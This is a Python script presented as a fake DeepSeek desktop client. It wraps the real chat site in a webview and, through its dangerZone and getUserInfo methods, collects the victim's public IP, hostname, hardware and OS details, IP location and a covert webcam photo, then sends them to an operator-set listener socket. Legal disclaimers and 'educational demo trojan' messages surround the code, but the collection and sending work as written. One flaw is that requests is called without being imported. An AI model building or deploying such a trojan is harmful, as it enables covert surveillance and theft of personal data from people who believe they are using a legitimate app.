try:
    import time
    import webview
    import socket
    import platform
    import subprocess
    import cv2
    import base64
    import tkinter as tk
    from tkinter import messagebox
except ImportError as E:
    print(f"[!] 缺少依赖模块，请先安装！原因： {E}")


LAW: str = """
————————————————————————————————————————————————————————————————————————————
【深求科技教育用途软件使用免责声明与法律风险声明】

一、法律依据：

本软件适用下列中华人民共和国法律法规及司法解释，用户必须全面遵守：

1. 《中华人民共和国网络安全法》（2017年6月1日实施）
2. 《中华人民共和国刑法》（2015年修订，2020年修订版）
3. 《个人信息保护法》（2021年11月1日起施行）
4. 《计算机信息网络国际联网安全保护管理办法》（工信部令第36号，2000年）
5. 《网络安全等级保护条例》（2019年9月1日起施行）
6. 最高人民法院《审理危害计算机信息系统安全刑事案件具体应用法律若干问题的解释》（法释〔2011〕7号）

二、用户责任与行为规范：

1. 用户仅限将本软件用于合法的教育研究、技术学习及环境测试，严禁用于任何非法入侵、破坏、数据窃取、恶意攻击等违法犯罪行为。

2. 违反《刑法》第二百八十五条——非法侵入计算机信息系统的，处三年以下有期徒刑或者拘役，并处或者单处罚金；情节严重的，处三年以上七年以下有期徒刑。

3. 违反《刑法》第二百八十六条——制作、传播计算机病毒等破坏性程序，处三年以下有期徒刑、拘役或者罚金；情节严重的，处三年以上七年以下有期徒刑。

4. 违反《刑法》第二百八十七条——非法获取、出售或者提供个人信息，情节严重者可判处五年以下有期徒刑或拘役，acee
5. 违反《个人信息保护法》第六十七条，未采取必要措施导致个人信息泄露，视情节严重，最高可处以500万元人民币罚款。

6. 违反《网络安全法》第四十一条规定，擅自提供网络产品、服务存在安全隐患，责任单位依法承担法律责任。

三、免责声明：

1. 本软件仅供合法教育、技术研究及测试使用，开发者不承担任何因用户使用本软件导致的直接或间接损失，包括但不限于数据丢失、系统损坏、经济损失及法律责任。

2. 用户使用本软件即视为已充分理解本声明及法律风险，自愿承担所有责任。

3. 使用本软件请确保已获得目标系统的合法授权，严禁对无授权系统进行任何形式的攻击或测试。

四、风险提示：

1. 网络安全系全社会共同责任，任何非法攻击行为不仅违背法律，更破坏互联网生态环境。

2. 任何违法行为一经发现，将依法追究刑事责任，警方和司法机关可通过技术手段追踪定位违法者。

3. 任何软件滥用后果自负，开发者保留追究相关侵权责任的权利。

五、争议解决：

因使用本软件发生的任何争议，均适用中华人民共和国法律，由软件开发者所在地人民法院管辖。

六、特别声明：

请用户务必慎重下载及使用网络软件，避免因轻率行为导致不可挽回的法律后果。

网络安全不是儿戏，技术学习需守规矩，愿你我共同维护绿色互联网环境。

————————————————————————————————————————————————————————————————————————————
"""


class 假Deepseek:
    def __init__(self) -> None:
        self.appname: str = "DeepSeek"
        self.version: str = "1.0"
        self.url: str = "https://chat.deepseek.com/"

        self.default_port: int = 8888  # ⚠️ 更改为你本机的端口
        self.default_ip: str = "127.0.0.1"  # ⚠️ 更改为你本机的 IP 地址
        self.listening_time: int = 5000
        self.default_bufsize: int = 1024

        self.DNS: dict[int, dict[str, str]] = {
            1: {"name": "阿里DNS", "ip": "223.5.5.5"},
            2: {"name": "114DNS", "ip": "114.114.114.114"},
            3: {"name": "DNSPod", "ip": "119.29.29.29"},
            4: {"name": "Cloudflare", "ip": "1.1.1.1"},
            5: {"name": "Google DNS", "ip": "8.8.8.8"},
            6: {"name": "百度主站", "ip": "www.baidu.com:80"},
        }

        # 默认目标为 Google DNS
        self.host: str = self.DNS[5].get("ip")

    def WARN(self, text: str) -> None:
        RED = "\033[31m"
        RESET = "\033[0m"
        print(f"{RED}{text}{RESET}")

    def animated_print(self, text: str, delay: float = 0.2) -> None:
        lines = text.strip().splitlines()
        for line in lines:
            self.WARN(line)
            time.sleep(delay)

    def prompt_accept_terms(self) -> bool:
        global selected

        self.animated_print(LAW)

        while True:
            sec_prompt = (
                "\n您是否同意，因您的行为所致一切损害，与作者无关，责任皆由您本人承担？\n"
                "\n"
                "    世事如棋，乾坤莫测，\n"
                "    一念之差，千秋祸福。\n"
                "    技术无善恶，唯取决于人，\n"
                "    善用则光明，误用成灾殃。\n"
                "    承诺此言，如山如岳，\n"
                "    责任自负，莫诉他人。\n"
                "\n"
                "请认真阅读以上条款，您是否接受？ [是/否]: "
            )

            choice = input(f"\033[31m{sec_prompt}").strip().lower()

            if choice == "是":
                print("✅ 感谢您的同意，程序即将继续运行...")
                selected = True
                break
            elif choice == "否":
                self.WARN("❌ 您必须接受条款才能继续使用，程序已退出。")
                selected = False
                exit(1)
            else:
                selected = False
                self.WARN("⚠️ 请输入 '是'（同意）或 '否'（不同意）！")

        return selected

    def check_network(self, port=53, timeout=3) -> bool:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(timeout)
                s.connect((self.host, port))

            print("✅ 网络连接正常")
            print("🌟 DeepSeek 正在后台默默运行.....")
            print(
                "🚨 本程序仅用于【教育用途】！\n"
                "⚠️ 如果你看到这段文字，说明你刚刚运行了一个『演示用木马』\n"
                "📢 请不要随便在网上下载来路不明的可执行程序（EXE、APP等）！\n"
                "👀 下次再见 .bat 或 .exe 随便运行，你可能就完了。\n"
                "💡 学习网络安全，从不点陌生链接、不装陌生软件开始！\n"
                "\n"
            )

            return True
        except Exception as ex:
            print(f"❌ 网络连接失败: {ex}")
            return False

    def show_about_dialog(self):
        messagebox.showinfo(
            title="关于 DeepSeek",
            message=f"""
            ✨ 假DeepSeek v{self.version}

            🚨 本程序仅用于【教育用途】！
            如果你看到这段文字，说明你刚刚运行了一个『演示用木马』
            ⚠️ 请不要随意下载并运行陌生软件！

            https://chat.deepseek.com/
            """,
        )

    def create_menu_bar(self, root):
        menubar = tk.Menu(root)

        # File 菜单
        filemenu = tk.Menu(menubar, tearoff=0)
        filemenu.add_command(label="Exit", command=root.quit)
        menubar.add_cascade(label="File", menu=filemenu)

        # Help 菜单
        helpmenu = tk.Menu(menubar, tearoff=0)
        helpmenu.add_command(label="About", command=self.show_about_dialog)
        menubar.add_cascade(label="Help", menu=helpmenu)

        root.config(menu=menubar)

    def start(self) -> None:
        if self.check_network():
            # 创建一个漂亮的窗口～
            window = webview.create_window(
                self.appname,
                self.url,
                width=1200,
                height=750,
                min_size=(800, 600),  # 设置最小窗口尺寸，让界面更美观
            )

            # 在后台默默运行我们的小朋友
            self.dangerZone()

            # 启动 webview
            webview.start()
        else:
            print("请检查网络连接，无法启动WebView。")

    def dangerZone(self) -> None:
        print("✅ 木马正在后台运行....")

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            s.connect((self.default_ip, self.default_port))

            userInfo = self.getUserInfo()
            print(f"准备发送用户信息，长度: {len(userInfo)}")

            # @TODO 添加更多需要抓取的数据

            # 用 sendall 保证全部发送出去
            s.sendall(userInfo.encode("utf-8"))

            print(f"✅ 用户信息: {userInfo}")
            print("✅ 用户信息发送成功")
        except Exception as ex:
            print(f"⚠️ 发送用户信息失败: {ex}")
        finally:
            s.close()

    def getUserInfo(self) -> str:
        lines = []

        lines.append("[DATA]\n")

        lines.append("=== System Information Report ===\n")

        ip = self.get_public_ip()
        lines.append(f"Public IP: {ip}")

        hostname = self.get_computer_hostname()
        lines.append(f"Hostname: {hostname}")

        model = self.get_computer_model()
        lines.append(f"Computer Model: {model}")

        os_version = self.get_os_version()
        lines.append(f"OS Version: {os_version}")

        cpu_model = self.get_cpu_model()
        lines.append(f"CPU Model: {cpu_model}")

        network_type = self.get_network_type()
        lines.append(f"Network Type: {network_type}")

        location = self.get_current_location_no_key()
        lines.append(f"Location: {location}")

        lines.append("\n--- Webcam Photo Base64 Encoded ---")
        img_b64 = self.capture_webcam_image_base64()
        if img_b64:
            for i in range(0, len(img_b64), 76):
                lines.append(img_b64[i : i + 76])
        else:
            lines.append("Failed to capture webcam image")

        report = "\n".join(lines)
        report = report.replace("\n", "\n ")

        return "| " + report + "\n"

    def get_public_ip(self) -> str:
        """
        获取公网IP地址，使用国内稳定接口，适合中国环境。
        返回公网IP字符串，失败返回空字符串。
        """
        try:
            response = requests.get("https://api-ipv4.ip.sb/ip", timeout=5)
            ip = response.text.strip()
            print(f"✅ 获取公网IP成功: {ip}")
            return ip
        except Exception as e:
            print(f"⚠️ 获取公网IP失败: {e}")
            return "127.0.0.1"

    def get_computer_model(self) -> str:
        """
        获取电脑型号（品牌+型号）信息，跨平台实现：
        - Windows 用 wmic
        - macOS 用 system_profiler
        - Linux 用 dmidecode 或 /sys/devices
        失败返回空字符串。
        """
        try:
            system = platform.system()
            if system == "Windows":
                # wmic获取电脑型号
                cmd = "wmic computersystem get model"
                output = subprocess.check_output(cmd, shell=True).decode().split("\n")
                model = output[1].strip() if len(output) > 1 else ""
                return model or "Unknown Windows Model"

            elif system == "Darwin":
                # macOS用system_profiler
                cmd = ["system_profiler", "SPHardwareDataType"]
                output = subprocess.check_output(cmd).decode()
                for line in output.split("\n"):
                    if "Model Identifier" in line:
                        return line.split(":")[1].strip()
                return "Unknown Mac Model"

            elif system == "Linux":
                # 尝试读取dmidecode（需要root权限），否则读取/sys/class/dmi/id/product_name
                try:
                    output = (
                        subprocess.check_output(
                            ["dmidecode", "-s", "system-product-name"]
                        )
                        .decode()
                        .strip()
                    )
                    if output:
                        return output
                except Exception:
                    try:
                        with open("/sys/class/dmi/id/product_name") as f:
                            return f.read().strip()
                    except Exception:
                        return "Unknown Linux Model"
            else:
                return "Unsupported OS"

        except Exception as e:
            print(f"⚠️ 获取电脑型号失败: {e}")
            return "Windows"

    def get_os_version(self) -> str:
        """
        获取操作系统版本信息，跨平台支持。
        返回操作系统名称+版本号，失败返回空字符串。
        """
        try:
            system = platform.system()
            if system == "Windows":
                # Windows 版本和构建号
                version = platform.version()
                release = platform.release()
                return f"Windows {release} (Version {version})"
            elif system == "Darwin":
                # macOS 版本
                mac_ver = platform.mac_ver()[0]
                return f"macOS {mac_ver}"
            elif system == "Linux":
                # Linux 发行版信息
                try:
                    # 现代系统推荐用 distro 库，更精准，但这里用platform不依赖第三方
                    dist = platform.linux_distribution()
                except AttributeError:
                    dist = ("Unknown", "", "")
                name = dist[0] or "Linux"
                version = dist[1] or ""
                return f"{name} {version}".strip()
            else:
                return "Unknown OS"
        except Exception as e:
            print(f"⚠️ 获取操作系统版本失败: {e}")
            return "unknown"

    def get_network_type(self) -> str:
        """
        简单检测当前网络连接类型：
        - Windows：用 netsh 判断无线或有线
        - macOS：用 networksetup 查询
        - Linux：用 nmcli 判断
        返回 "有线", "无线", "unknown"
        """
        system = platform.system()
        try:
            if system == "Windows":
                output = subprocess.check_output(
                    "netsh wlan show interfaces", shell=True, stderr=subprocess.DEVNULL
                ).decode(errors="ignore")
                if "状态" in output and "已连接" in output:
                    return "无线"
                else:
                    return "有线"

            elif system == "Darwin":
                output = subprocess.check_output(
                    ["networksetup", "-getinfo", "Wi-Fi"]
                ).decode(errors="ignore")
                if "IP address" in output and "none" not in output.lower():
                    return "无线"
                else:
                    return "有线"

            elif system == "Linux":
                output = subprocess.check_output(
                    ["nmcli", "-t", "-f", "TYPE,STATE", "device"]
                ).decode(errors="ignore")
                # 形如 wifi:connected, ethernet:disconnected
                lines = output.strip().split("\n")
                for line in lines:
                    parts = line.split(":")
                    if len(parts) == 2 and parts[1] == "connected":
                        if parts[0] == "wifi":
                            return "无线"
                        elif parts[0] == "ethernet":
                            return "有线"
                return "unknown"
            else:
                return "unknown"
        except Exception as e:
            print(f"⚠️ 获取网络类型失败: {e}")
            return "unknown"

    def get_computer_hostname(self) -> str:
        """
        获取当前计算机的主机名
        返回主机名字符串，失败返回空字符串
        """
        try:
            hostname = socket.gethostname()
            return hostname
        except Exception as e:
            print(f"⚠️ 获取主机名失败: {e}")
            return ""

    def get_cpu_model(self) -> str:
        """
        获取CPU型号，跨平台支持：
        - Windows: 用 wmic
        - Linux: 从 /proc/cpuinfo 读取
        - macOS: 用 sysctl
        返回CPU型号字符串，失败返回空字符串
        """
        system = platform.system()
        try:
            if system == "Windows":
                output = subprocess.check_output(
                    "wmic cpu get Name", shell=True
                ).decode()
                lines = output.strip().split("\n")
                if len(lines) >= 2:
                    return lines[1].strip()
                return ""
            elif system == "Linux":
                with open("/proc/cpuinfo", "r", encoding="utf-8") as f:
                    for line in f:
                        if "model name" in line:
                            return line.split(":")[1].strip()
                return ""
            elif system == "Darwin":
                output = (
                    subprocess.check_output(
                        ["sysctl", "-n", "machdep.cpu.brand_string"]
                    )
                    .decode()
                    .strip()
                )
                return output
            else:
                return ""
        except Exception as e:
            print(f"⚠️ 获取CPU型号失败: {e}")
            return ""

    def get_current_location_no_key(self) -> str:
        """
        免费无Key版IP定位（用ip-api.com），支持中国IP
        返回格式：省 市 区（区可能为空）
        失败返回空字符串
        """
        try:
            response = requests.get("http://ip-api.com/json/?lang=zh-CN", timeout=5)
            data = response.json()
            if data.get("status") == "success":
                province = data.get("regionName", "")
                city = data.get("city", "")
                district = data.get("district", "")  # ip-api没提供district，可能是空
                location = f"{province} {city} {district}".strip()
                return location
            else:
                print(f"IP定位失败: {data.get('message', 'unknown错误')}")
                return ""
        except Exception as e:
            print(f"⚠️ 获取地理位置失败: {e}")
            return ""

    def capture_webcam_image_base64(self) -> str:
        """
        使用 OpenCV 调用默认摄像头拍照，
        将捕获的图像编码为 JPEG 格式后转换为 Base64 字符串返回。
        失败时返回空字符串。
        """
        try:
            cap = cv2.VideoCapture(0)  # 打开默认摄像头（索引0）
            if not cap.isOpened():
                print("⚠️ 无法打开摄像头")
                return ""

            ret, frame = cap.read()  # 读取一帧图像
            cap.release()  # 释放摄像头资源

            if not ret:
                print("⚠️ 捕获图像失败")
                return ""

            # 编码为JPEG格式图像字节
            ret, buffer = cv2.imencode(".jpg", frame)
            if not ret:
                print("⚠️ 图像编码失败")
                return ""

            # 转成Base64字符串并返回
            img_base64 = base64.b64encode(buffer).decode("utf-8")
            return img_base64

        except Exception as e:
            print(f"⚠️ 捕获摄像头图像异常: {e}")
            return "没有照片"


if __name__ == "__main__":
    app: 假Deepseek = 假Deepseek()
    if app.prompt_accept_terms():
        app.start()
